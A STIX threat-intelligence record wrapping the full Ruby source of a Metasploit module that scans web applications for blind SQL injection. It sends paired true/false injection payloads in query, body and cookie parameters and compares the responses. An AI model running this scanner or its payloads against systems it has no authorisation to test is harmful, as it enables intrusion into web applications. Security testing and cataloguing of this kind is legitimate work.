{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--59672bd3-ee4e-409f-892d-18f1ecbd8f37",
    "created": "2024-08-14T16:29:18.081136Z",
    "modified": "2024-08-14T16:29:18.08114Z",
    "name": "HTTP Blind SQL Injection Scanner",
    "description": " This module identifies the existence of Blind SQL injection issues in GET/POST Query parameters values. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/blind_sql_query.rb",
            "external_id": "blind_sql_query.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanUniqueQuery\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'HTTP Blind SQL Injection Scanner',\n      'Description'\t=> %q{\n        This module identifies the existence of Blind SQL injection issues\n        in GET/POST Query parameters values.\n      },\n      'Author' \t\t=> [ 'et [at] cyberspace.org' ],\n      'License'\t\t=> BSD_LICENSE))\n\n    register_options(\n      [\n        OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),\n        OptString.new('PATH', [ true,  \"The path/file to test SQL injection\", '/index.asp']),\n        OptString.new('QUERY', [ false,  \"HTTP URI Query\", '']),\n        OptString.new('DATA', [ false, \"HTTP Body Data\", '']),\n        OptString.new('COOKIE',[ false, \"HTTP Cookies\", ''])\n      ])\n\n  end\n\n  def run_host(ip)\n    # Force http verb to be upper-case, because otherwise some web servers such as\n    # Apache might throw you a 501\n    http_method = datastore['METHOD'].upcase\n\n    gvars = Hash.new()\n    pvars = Hash.new()\n    cvars = Hash.new()\n\n    rnum=rand(10000)\n\n    inivalstr = [\n      [ 'numeric',\n      \" AND #{rnum}=#{rnum} \",\n      \" AND #{rnum}=#{rnum+1} \"\n      ],\n      [ 'single quotes',\n      \"' AND '#{rnum}'='#{rnum}\",\n      \"' AND '#{rnum}'='#{rnum+1}\"\n      ],\n      [ 'double quotes',\n      \"\\\" AND \\\"#{rnum}\\\"=\\\"#{rnum}\",\n      \"\\\" AND \\\"#{rnum}\\\"=\\\"#{rnum+1}\"\n      ],\n      [ 'OR single quotes uncommented',\n      \"' OR '#{rnum}'='#{rnum}\",\n      \"' OR '#{rnum}'='#{rnum+1}\"\n      ],\n      [ 'OR single quotes closed and commented',\n      \"' OR '#{rnum}'='#{rnum}'--\",\n      \"' OR '#{rnum}'='#{rnum+1}'--\"\n      ],\n      [ 'hex encoded OR single quotes uncommented',\n      \"'%20OR%20'#{rnum}'%3D'#{rnum}\",\n      \"'%20OR%20'#{rnum}'%3D'#{rnum+1}\"\n      ],\n      [ 'hex encoded OR single quotes closed and commented',\n      \"'%20OR%20'#{rnum}'%3D'#{rnum}'--\",\n      \"'%20OR%20'#{rnum}'%3D'#{rnum+1}'--\"\n      ]\n    ]\n\n    # Creating strings with true and false values\n    valstr = []\n    inivalstr.each do |vstr|\n      # With true values\n      valstr << vstr\n      # With false values, appending 'x' to real value\n      valstr << ['False char '+vstr[0],'x'+vstr[1],'x'+vstr[2]]\n      # With false values, appending '0' to real value\n      valstr << ['False num '+vstr[0],'0'+vstr[1],'0'+vstr[2]]\n    end\n\n    #valstr.each do |v|\n    #\tprint_status(\"#{v[0]}\")\n    #\tprint_status(\"#{v[1]}\")\n    #\tprint_status(\"#{v[2]}\")\n    #end\n\n    #\n    # Dealing with empty query/data and making them hashes.\n    #\n\n    if  !datastore['QUERY'] or datastore['QUERY'].empty?\n      datastore['QUERY'] = nil\n      gvars = nil\n    else\n      gvars = queryparse(datastore['QUERY']) #Now its a Hash\n    end\n\n    if  !datastore['DATA'] or datastore['DATA'].empty?\n      datastore['DATA'] = nil\n      pvars = nil\n    else\n      pvars = queryparse(datastore['DATA'])\n    end\n\n    if  !datastore['COOKIE'] or datastore['COOKIE'].empty?\n      datastore['COOKIE'] = nil\n      cvars = nil\n    else\n      cvars = queryparse(datastore['COOKIE'])\n    end\n\n    verifynr=2\n\n    i=0\n    k=0\n    c=0\n\n    normalres = nil\n\n    verifynr.times do |j|\n    #SEND NORMAL REQUEST\n      begin\n        normalres = send_request_cgi({\n          'uri'  \t\t=> normalize_uri(datastore['PATH']),\n          'vars_get' \t=> gvars,\n          'method'   \t=> http_method,\n          'ctype'\t\t=> 'application/x-www-form-urlencoded',\n          'cookie'    => datastore['COOKIE'],\n          'data'      => datastore['DATA']\n        }, 20)\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n\n      if not normalres\n        print_error(\"No response\")\n        return\n      else\n        if i==0\n          k = normalres.body.length\n          c = normalres.code.to_i\n        else\n          if k != normalres.body.length\n            print_error(\"Normal response body vary\")\n            return\n          end\n          if c != normalres.code.to_i\n            print_error(\"Normal response code vary\")\n            return\n          end\n        end\n      end\n    end\n\n    print_status(\"[Normal response body: #{k}  code: #{c}]\")\n\n    pinj = false\n\n    valstr.each do |tarr|\n      #QUERY\n      if gvars\n        gvars.each do |key,value|\n          vprint_status(\"- Testing '#{tarr[0]}' Parameter #{key}:\")\n\n          #SEND TRUE REQUEST\n          testgvars = queryparse(datastore['QUERY']) #Now its a Hash\n          testgvars[key] = testgvars[key]+tarr[1]\n          t = testgvars[key]\n\n          begin\n            trueres = send_request_cgi({\n              'uri'  \t\t=>  normalize_uri(datastore['PATH']),\n              'vars_get' \t=>  testgvars,\n              'method'   \t=>  http_method,\n              'ctype'\t\t=> 'application/x-www-form-urlencoded',\n              'cookie'    => datastore['COOKIE'],\n              'data'      => datastore['DATA']\n            }, 20)\n          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          rescue ::Timeout::Error, ::Errno::EPIPE\n          end\n\n          #SEND FALSE REQUEST\n          testgvars = queryparse(datastore['QUERY']) #Now its a Hash\n          testgvars[key] = testgvars[key]+tarr[2]\n\n          begin\n            falseres = send_request_cgi({\n              'uri'  \t\t=>  normalize_uri(datastore['PATH']),\n              'vars_get' \t=>  testgvars,\n              'method'   \t=>  http_method,\n              'ctype'\t\t=> 'application/x-www-form-urlencoded',\n              'cookie'    => datastore['COOKIE'],\n              'data'      => datastore['DATA']\n            }, 20)\n          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          rescue ::Timeout::Error, ::Errno::EPIPE\n          end\n\n          pinja = false\n          pinjb = false\n          pinjc = false\n          pinjd = false\n\n          pinja = detection_a(normalres,trueres,falseres,tarr)\n          pinjb = detection_b(normalres,trueres,falseres,tarr)\n          pinjc = detection_c(normalres,trueres,falseres,tarr)\n          pinjd = detection_d(normalres,trueres,falseres,tarr)\n\n          if pinja or pinjb or pinjc  or pinjd\n            print_good(\"Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}\")\n            print_good(\"[#{t}]\")\n\n            report_web_vuln(\n              :host\t=> ip,\n              :port\t=> rport,\n              :vhost  => vhost,\n              :ssl    => ssl,\n              :path\t=> normalize_uri(datastore['PATH']),\n              :method => http_method,\n              :pname  => key,\n              :proof  => \"blind sql inj.\",\n              :risk   => 2,\n              :confidence   => 50,\n              :category     => 'SQL injection',\n              :description  => \"Blind sql injection of type #{tarr[0]} in param #{key}\",\n              :name   => 'Blind SQL injection'\n            )\n          else\n            vprint_status(\"NOT Vulnerable #{datastore['PATH']} parameter #{key}\")\n          end\n        end\n      end\n\n      #DATA\n      if pvars\n        pvars.each do |key,value|\n          print_status(\"- Testing '#{tarr[0]}' Parameter #{key}:\")\n\n          #SEND TRUE REQUEST\n          testpvars = queryparse(datastore['DATA']) #Now its a Hash\n          testpvars[key] = testpvars[key]+tarr[1]\n          t = testpvars[key]\n\n          pvarstr = \"\"\n          testpvars.each do |tkey,tvalue|\n            if pvarstr\n              pvarstr << '&'\n            end\n            pvarstr << tkey+'='+tvalue\n          end\n\n          begin\n            trueres = send_request_cgi({\n              'uri'  \t\t=>  normalize_uri(datastore['PATH']),\n              'vars_get' \t=>  gvars,\n              'method'   \t=>  http_method,\n              'ctype'\t\t=> 'application/x-www-form-urlencoded',\n              'cookie'    => datastore['COOKIE'],\n              'data'      => pvarstr\n            }, 20)\n          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          rescue ::Timeout::Error, ::Errno::EPIPE\n          end\n\n          #SEND FALSE REQUEST\n          testpvars = queryparse(datastore['DATA']) #Now its a Hash\n          testpvars[key] = testpvars[key]+tarr[2]\n\n          pvarstr = \"\"\n          testpvars.each do |tkey,tvalue|\n            if pvarstr\n              pvarstr << '&'\n            end\n            pvarstr << tkey+'='+tvalue\n          end\n\n          begin\n            falseres = send_request_cgi({\n              'uri'  \t\t=>  normalize_uri(datastore['PATH']),\n              'vars_get' \t=>  gvars,\n              'method'   \t=>  http_method,\n              'ctype'\t\t=> 'application/x-www-form-urlencoded',\n              'cookie'    => datastore['COOKIE'],\n              'data'      => pvarstr\n            }, 20)\n          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          rescue ::Timeout::Error, ::Errno::EPIPE\n          end\n\n          pinja = false\n          pinjb = false\n          pinjc = false\n          pinjd = false\n\n          pinja = detection_a(normalres,trueres,falseres,tarr)\n          pinjb = detection_b(normalres,trueres,falseres,tarr)\n          pinjc = detection_c(normalres,trueres,falseres,tarr)\n          pinjd = detection_d(normalres,trueres,falseres,tarr)\n\n          if pinja or pinjb or pinjc or pinjd\n            print_good(\"Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}\")\n            print_good(\"[#{t}]\")\n\n            report_web_vuln(\n              :host\t=> ip,\n              :port\t=> rport,\n              :vhost  => vhost,\n              :ssl    => ssl,\n              :path\t=> datastore['PATH'],\n              :method => http_method,\n              :pname  => key,\n              :proof  => \"blind sql inj.\",\n              :risk   => 2,\n              :confidence   => 50,\n              :category     => 'SQL injection',\n              :description  => \"Blind sql injection of type #{tarr[0]} in param #{key}\",\n              :name   => 'Blind SQL injection'\n            )\n          else\n            vprint_status(\"NOT Vulnerable #{datastore['PATH']} parameter #{key}\")\n          end\n        end\n      end\n    end\n  end\n\n  def detection_a(normalr,truer,falser,tarr)\n    # print_status(\"A\")\n\n    # DETECTION A\n    # Very simple way to compare responses, this can be improved alot , at this time just the simple way\n\n    if normalr and truer\n      #Very simple way to compare responses, this can be improved alot , at this time just the simple way\n      reltruesize = truer.body.length-(truer.body.scan(/#{tarr[1]}/).length*tarr[1].length)\n      normalsize = normalr.body.length\n\n      #print_status(\"normalsize #{normalsize} truesize #{reltruesize}\")\n\n      if reltruesize == normalsize\n        if falser\n          relfalsesize = falser.body.length-(falser.body.scan(/#{tarr[2]}/).length*tarr[2].length)\n\n          #print_status(\"falsesize #{relfalsesize}\")\n\n          if reltruesize > relfalsesize\n            print_status(\"Detected by test A\")\n            return true\n          else\n            return false\n          end\n        else\n          vprint_status(\"NO False Response.\")\n        end\n      else\n        vprint_status(\"Normal and True requests are different.\")\n      end\n    else\n      print_status(\"No response.\")\n    end\n\n    return false\n  end\n\n  def detection_b(normalr,truer,falser,tarr)\n    # print_status(\"B\")\n\n    # DETECTION B\n    # Variance on res body\n\n    if normalr and truer\n      if falser\n        #print_status(\"N: #{normalr.body.length} T: #{truer.body.length} F: #{falser.body.length} T1: #{tarr[1].length}  F2: #{tarr[2].length} #{tarr[1].length+tarr[2].length}\")\n\n        if (truer.body.length-tarr[1].length) != normalr.body.length and (falser.body.length-tarr[2].length) == normalr.body.length\n          print_status(\"Detected by test B\")\n          return true\n        end\n        if (truer.body.length-tarr[1].length) == normalr.body.length and (falser.body.length-tarr[2].length) != normalr.body.length\n          print_status(\"Detected by test B\")\n          return true\n        end\n      end\n    end\n\n    return false\n  end\n\n  def detection_c(normalr,truer,falser,tarr)\n    # print_status(\"C\")\n\n    # DETECTION C\n    # Variance on res code of true or false statements\n\n    if normalr and truer\n      if falser\n        if truer.code.to_i != normalr.code.to_i and falser.code.to_i == normalr.code.to_i\n          print_status(\"Detected by test C\")\n          return true\n        end\n        if truer.code.to_i == normalr.code.to_i and falser.code.to_i != normalr.code.to_i\n          print_status(\"Detected by test C\")\n          return true\n        end\n      end\n    end\n\n    return false\n  end\n\n  def detection_d(normalr,truer,falser,tarr)\n    # print_status(\"D\")\n\n    # DETECTION D\n    # Variance PERCENTAGE MIN MAX on res body\n\n    # 2% 50%\n    max_diff_perc = 2\n    min_diff_perc = 50\n\n    if normalr and truer\n      if falser\n        nl= normalr.body.length\n        tl= truer.body.length\n        fl= falser.body.length\n\n        if nl == 0\n          nl = 1\n        end\n        if tl == 0\n          tl = 1\n        end\n        if fl == 0\n          fl = 1\n        end\n\n        ntmax = [ nl,tl ].max\n        ntmin = [ nl,tl ].min\n        diff_nt_perc = ((ntmax - ntmin)*100)/(ntmax)\n        diff_nt_f_perc = ((ntmax - fl)*100)/(ntmax)\n\n        if diff_nt_perc <= max_diff_perc and diff_nt_f_perc > min_diff_perc\n          print_status(\"Detected by test D\")\n          return true\n        end\n\n        nfmax = [ nl,fl ].max\n        nfmin = [ nl,fl ].min\n        diff_nf_perc = ((nfmax - nfmin)*100)/(nfmax)\n        diff_nf_t_perc = ((nfmax - tl)*100)/(nfmax)\n\n        if diff_nf_perc <= max_diff_perc and diff_nf_t_perc > min_diff_perc\n          print_status(\"Detected by test D\")\n          return true\n        end\n      end\n    end\n\n    return false\n  end\nend\n"
}